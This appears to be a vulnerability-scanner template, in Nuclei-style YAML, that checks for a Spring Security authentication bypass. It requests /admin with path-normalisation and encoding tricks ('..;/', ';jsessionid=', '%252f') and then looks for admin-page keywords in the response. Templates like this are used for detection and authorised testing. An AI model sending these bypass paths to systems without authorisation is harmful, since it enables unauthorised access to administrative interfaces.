http:
- matchers:
  - case-insensitive: true
    condition: or
    part: body
    type: word
    words:
    - admin panel
    - dashboard
    - management console
    - welcome admin
  method: GET
  path:
  - '{{BaseURL}}/admin'
  - '{{BaseURL}}/admin/'
  - '{{BaseURL}}/admin;jsessionid=test'
  - '{{BaseURL}}/admin/.'
  - '{{BaseURL}}/admin/./'
  - '{{BaseURL}}/admin/..;/admin'
  - '{{BaseURL}}/./admin'
  - '{{BaseURL}}//admin'
  - '{{BaseURL}}/admin%2f'
  - '{{BaseURL}}/admin%252f'
  stop-at-first-match: true
id: spring-security-bypass
info:
  author: security-team
  description: Attempts to bypass Spring Security authentication
  name: Spring Security Authentication Bypass
  severity: high
  tags: spring-security,bypass,auth,java
